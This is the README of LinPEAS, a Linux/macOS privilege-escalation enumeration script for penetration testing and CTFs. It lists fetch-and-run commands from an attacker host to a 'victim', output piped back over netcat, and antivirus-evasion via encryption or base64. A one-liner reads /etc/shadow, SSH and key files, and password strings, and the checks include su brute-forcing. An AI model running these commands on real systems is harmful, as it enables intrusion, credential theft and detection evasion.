# LinPEAS - Linux Privilege Escalation Awesome Script 
[![CI-master_test](https://github.com/carlospolop/PEASS-ng/actions/workflows/CI-master_tests.yml/badge.svg)](https://github.com/carlospolop/PEASS-ng/actions/workflows/CI-master_tests.yml)

![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)

**LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/privilege-escalation)**

Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)**.

[![asciicast](https://asciinema.org/a/250532.png)](https://asciinema.org/a/309566)


## Quick Start
```bash
#From github
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

```bash
#Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

#Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

#Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

```bash
#Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors
```

## AV bypass
```bash
#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
```

## MacPEAS

Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed!!**

## Basic Information

The goal of this script is to search for possible **Privilege Escalation Paths** (tested in Debian, CentOS, FreeBSD and OpenBSD).

This script doesn't have any dependency.

It uses **/bin/sh** syntax, so can run in anything supporting `sh` (and the binaries and parameters used).

By default, **linpeas won't write anything to disk and won't try to login as any other user using `su`**.

By default linpeas takes around **4 mins** to complete, but It could take from **5 to 10 minutes** to execute all the checks using **-a** parameter *(Recommended option for CTFs)*:
- From less than 1 min to 2 mins to make almost all the checks
- Almost 1 min to search for possible passwords inside all the accesible files of the system
- 20s/user bruteforce with top2000 passwords *(need `-a`)* - Notice that this check is **super noisy**
- 1 min to monitor the processes in order to find very frequent cron jobs *(need `-a`)* - Notice that this check will need to **write** some info inside a file that will be deleted

**Other parameters:**
- **-a** (all checks) - This will **execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using `su` with the top2000 passwords.**
- **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
- **-P** (Password) - Pass a password that will be used with `sudo -l` and bruteforcing other users
- **-v** (verbose) - Print information about the checks that haven't discovered anything and about the time each check took

This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.

LinPEAS also **exports a new PATH** variable during the execution if common folders aren't present in the original PATH variable.

![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/help.png)

## Hosts Discovery and Port Scanning

With LinPEAS you can also **discover hosts automatically** using `fping`, `ping` and/or `nc`, and **scan ports** using `nc`.

LinPEAS will **automatically search for this binaries** in `$PATH` and let you know if any of them is available. In that case you can use LinPEAS to hosts dicovery and/or port scanning.

![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/network.png)


## Colors

<details>
<summary>Details</summary>

LinPEAS uses colors to indicate where does each section begin. But **it also uses them the identify potencial misconfigurations**.

The ![](https://placehold.it/15/b32400/000000?text=+) **Red/Yellow** ![](https://placehold.it/15/fff500/000000?text=+) color is used for identifing configurations that lead to PE (99% sure).

The ![](https://placehold.it/15/b32400/000000?text=+) **Red** color is used for identifing suspicious configurations that could lead to PE:
- Possible exploitable kernel versions
- Vulnerable sudo versions
- Identify processes running as root
- Not mounted devices
- Dangerous fstab permissions
- Writable files in interesting directories
- SUID/SGID binaries that have some vulnerable version (it also specifies the vulnerable version)
- SUDO binaries that can be used to escalate privileges in sudo -l (without passwd) (https://gtfobins.github.io/)
- Check /etc/doas.conf
- 127.0.0.1 in netstat
- Known files that could contain passwords
- Capabilities in interesting binaries
- Interesting capabilities of a binary
- Writable folders and wilcards inside info about cron jobs
- Writables folders in PATH
- Groups that could lead to root
- Files that could contains passwords
- Suspicious cronjobs

The ![](https://placehold.it/15/66ff33/000000?text=+) **Green** color is used for:
- Common processes run by root
- Common not interesting devices to mount
- Not dangerous fstab permissions
- SUID/SGID common binaries (the bin was already found in other machines and searchsploit doesn't identify any vulnerable version)
- Common .sh files in path
- Common names of users executing processes
- Common cronjobs

The ![](https://placehold.it/15/0066ff/000000?text=+) **Blue** color is used for:
- Users without shell
- Mounted devices

The ![](https://placehold.it/15/33ccff/000000?text=+) **Light Cyan** color is used for:
- Users with shell

The ![](https://placehold.it/15/bf80ff/000000?text=+) **Light Magenta** color is used for:
- Current username

</details>

## One liner

Here you have an old linpe version script in one line, **just copy and paste it**;)

**The color filtering is not available in the one-liner** (the lists are too big)

This one-liner is deprecated (I'm not going to update it any more), but it could be useful in some cases so it will remain here.

The default file where all the data is stored is: */tmp/linPE* (you can change it at the beginning of the script)


```sh
file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm -rf $file;echo "File: $file";echo "[+]Gathering system information...";printf $B"[*] "$RED"BASIC SYSTEM INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Operative system\n"$NC >> $file;(cat /proc/version || uname -a ) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"PATH\n"$NC >> $file;echo $PATH 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Date\n"$NC >> $file;date 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo version\n"$NC >> $file;sudo -V 2>/dev/null| grep "Sudo ver" >> $file;echo "" >> $file;printf $Y"[+] "$RED"selinux enabled?\n"$NC >> $file;sestatus 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Useful software?\n"$NC >> $file;which nc ncat netcat wget curl ping gcc make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Capabilities\n"$NC >> $file;getcap -r / 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Environment\n"$NC >> $file;(set || env) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Top and cleaned proccesses\n"$NC >> $file;ps aux 2>/dev/null | grep -v "\[" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Binary processes permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Services\n"$NC >> $file;(/usr/sbin/service --status-all || /sbin/chkconfig --list || /bin/rc-status) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Different processes executed during 1 min (HTB)\n"$NC >> $file;if [ "`ps -e --format cmd`" ]; then for i in {1..121}; do ps -e --format cmd >> $file.tmp1; sleep 0.5; done; sort $file.tmp1 | uniq | grep -v "\[" | sed '/^.\{500\}./d' >> $file; rm $file.tmp1; fi;echo "" >> $file;printf $Y"[+] "$RED"Proccesses binary permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Scheduled tasks\n"$NC >> $file;crontab -l 2>/dev/null >> $file;ls -al /etc/cron* 2>/dev/null >> $file;cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root /var/spool/anacron 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Any sd* disk in /dev?\n"$NC >> $file;ls /dev 2>/dev/null | grep -i "sd" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Storage information\n"$NC >> $file;df -h 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Unmounted file-system?\n"$NC >> $file;cat /etc/fstab 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Printer?\n"$NC >> $file;lpstat -a 2>/dev/null >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering network information...";printf $B"[*] "$RED"NETWORK INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Hostname, hosts and DNS\n"$NC >> $file;cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" >> $file;dnsdomainname 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Networks and neightbours\n"$NC >> $file;cat /etc/networks 2>/dev/null >> $file;(ifconfig || ip a) 2>/dev/null >> $file;iptables -L 2>/dev/null >> $file;ip n 2>/dev/null >> $file;route -n 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Ports\n"$NC >> $file;(netstat -punta || ss -t; ss -u) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Can I sniff with tcpdump?\n"$NC >> $file;timeout 1 tcpdump >> $file 2>&1;echo "" >> $file;echo "" >> $file;echo "[+]Gathering users information...";printf $B"[*] "$RED"USERS INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Me\n"$NC >> $file;(id || (whoami && groups)) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l without password\n"$NC >> $file;echo '' | sudo -S -l -k 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Do I have PGP keys?\n"$NC >> $file;gpg --list-keys 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Superusers\n"$NC >> $file;awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Login\n"$NC >> $file;w 2>/dev/null >> $file;last 2>/dev/null | tail >> $file;echo "" >> $file;printf $Y"[+] "$RED"Users with console\n"$NC >> $file;cat /etc/passwd 2>/dev/null | grep "sh$" >> $file;echo "" >> $file;printf $Y"[+] "$RED"All users\n"$NC >> $file;cat /etc/passwd 2>/dev/null | cut -d: -f1 >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering files information...";printf $B"[*] "$RED"INTERESTING FILES\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"SUID\n"$NC >> $file;find / -perm -4000 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"SGID\n"$NC >> $file;find / -perm -g=s -type f 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside \$HOME (limit 20)\n"$NC >> $file;ls -la $HOME 2>/dev/null | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"20 First files of /home\n"$NC >> $file;find /home -type f 2>/dev/null | column -t | grep -v -i "/"$USER | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside .ssh directory?\n"$NC >> $file;find  /home /root -name .ssh 2>/dev/null -exec ls -laR {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"*sa_key* files\n"$NC >> $file;find / -type f -name "*sa_key*" -ls 2>/dev/null -exec ls -l {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"Mails?\n"$NC >> $file;ls -alh /var/mail/ /var/spool/mail/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"NFS exports?\n"$NC >> $file;cat /etc/exports 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Hashes inside /etc/passwd? Readable /etc/shadow or /etc/master.passwd?\n"$NC >> $file;grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null >> $file;cat /etc/shadow /etc/master.passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Readable /root?\n"$NC >> $file;ls -ahl /root/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Inside docker or lxc?\n"$NC >> $file;dockercontainer=`grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`;lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`;if [ "$dockercontainer" ]; then echo "Looks like we're in a Docker container" >> $file; fi;if [ "$lxccontainer" ]; then echo "Looks like we're in a LXC container" >> $file; fi;echo "" >> $file;printf $Y"[+] "$RED"*_history, profile, bashrc, httpd.conf\n"$NC >> $file;find / -type f \( -name "*_history" -o -name "profile" -o -name "*bashrc" -o -name "httpd.conf" \) -exec ls -l {} \; 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"All hidden files (not in /sys/) (limit 100)\n"$NC >> $file;find / -type f -iname ".*" -ls 2>/dev/null | grep -v "/sys/" | head -n 100 >> $file;echo "" >> $file;printf $Y"[+] "$RED"What inside /tmp, /var/tmp, /var/backups\n"$NC >> $file;ls -a /tmp /var/tmp /var/backups 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Interesting writable Files\n"$NC >> $file;USER=`whoami`;HOME=/home/$USER;find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'| sort | uniq >> $file;for g in `groups`; do find / \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'; done >> $file;echo "" >> $file;printf $Y"[+] "$RED"Web files?(output limited)\n"$NC >> $file;ls -alhR /var/www/ 2>/dev/null | head >> $file;ls -alhR /srv/www/htdocs/ 2>/dev/null | head >> $file;ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head >> $file;ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head >> $file;echo "" >> $file;printf $Y"[+] "$RED"Backup files?\n"$NC >> $file;find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*back*" -o -name "*bck*" \) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find IPs inside logs\n"$NC >> $file;grep -a -R -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' /var/log/ 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find 'password' or 'passw' string inside /home, /var/www, /var/log, /etc\n"$NC >> $file;grep -lRi "password\|passw" /home /var/www /var/log 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l (you need to puts the password and the result appear in console)\n"$NC >> $file;sudo -l;
```
## What does linpeas look for
<details>
  <summary>Details</summary>
  
- **System Information**
  - [x] SO & kernel version 
  - [x] Sudo version
  - [x] USBCreator PE
  - [x] PATH
  - [x] Date
  - [x] System stats
  - [x] Environment vars
  - [x] AppArmor, grsecurity, Execshield, PaX, SElinux, ASLR
  - [x] Printers
  - [x] Dmesg (signature verifications)
  - [x] Container?

- **Devices**
  - [x] sd* in /dev
  - [x] Unmounted filesystems

- **Available Software**
  - [x] Useful software
  - [x] Installed compilers

- **Processes, Cron, Services, Timers & Sockets**
  - [x] Cleaned processes
  - [x] Binary processes permissions
  - [x] Different processes executed during 1 min
  - [x] Cron jobs
  - [x] Services (list, writable .service, writable services binaries, systemd path, service binaries using relative path)
  - [x] All timers (list, writable .timer, writable binaries, relative paths)
  - [x] Sockets
  - [x] D-Bus

- **Network Information**
  - [x] Hostname, hosts & dns
  - [x] Content of /etc/inetd.conf
  - [x] Networks and neighbours
  - [x] Iptables rules
  - [x] Active ports
  - [x] Sniff permissions (tcpdump)

- **Users Information**
  - [x] Info about current user
  - [x] PGP keys
  - [x] `sudo -l` without password
  - [x] doas config file
  - [x] Pkexec policy
  - [x] Try to login using `su` as other users (using as passwords: null pass, username, reverse username, and top2000pwds)
  - [x] List of superusers
  - [x] List of users with console
  - [x] Login info (now, last logons, last time each user)
  - [x] List of all users
  - [x] Clipboard and highlighted text
  - [x] Password policy

- **Software Information**
  - [x] Check out [sensitive_files.yaml](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/build_lists/sensitive_files.yaml)

- **Generic Interesting Files**
  - [x] SUID & SGID files
  - [x] Capabilities
  - [x] /etc/ld.so.conf.d/
  - [x] Users with capabilities
  - [x] Files with ACLs
  - [x] .sh scripts in PATH
  - [x] scripts in /etc/profile.d
  - [x] scripts in init, init.d and systemd
  - [x] Hashes (passwd, group, shadow & master.passwd)
  - [x] Credentials in fstab
  - [x] Try to read root dir
  - [x] Files owned by root inside /home
  - [x] List of readable files belonging to root and not world readable
  - [x] Files modified in the last 5 minutes
  - [x] Log files (logrotten)
  - [x] Others files inside a folder owned by the current user
  - [x] Reduced list of files inside my home and /home
  - [x] Mail applications
  - [x] Mails
  - [x] Backup files
  - [x] DB files
  - [x] Web files
  - [x] Files that can contain passwords (and search for passwords inside *_history files)
  - [x] List of all hidden files
  - [x] List ALL writable files for current user (global, user and groups)
  - [x] Inside /tmp, /var/tmp and /var/backups
  - [x] Password ins config PHP files
  - [x] Get IPs, passwords and emails from logs
  - [x] password or credential files in home
  - [x] "pwd" and "passw" inside files (and get most probable lines)
  - [x] Check for posible variable names containing credentials in files
  - [x] Find "username" in fils
  - [x] Specific hashes (blowfish, joomla&vbulletin, phpbb3, wp, drupal, linuxmd5, apr1md5, sha512crypt, apachesha)
  - [x] Generic hashes MD5, SHA1, SHA256, SHA512
</details>

## Please, if this tool has been useful for you consider to donate

[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.patreon.com/peass)

## PEASS Style

Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/stores/peass)** and show your love for our favorite peas

## TODO

- Add more checks
- Mantain updated the list of vulnerable SUID binaries
- Mantain updated all the blacklists used to color the output

If you want to help with any of this, you can do it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues) or you can submit a pull request**.

If you find any issue, please report it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues)**.


**Linpeas** is being **updated** every time I find something that could be useful to escalate privileges.

## Advisory

All the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

## License

MIT License

By Polop<sup>(TM)</sup>
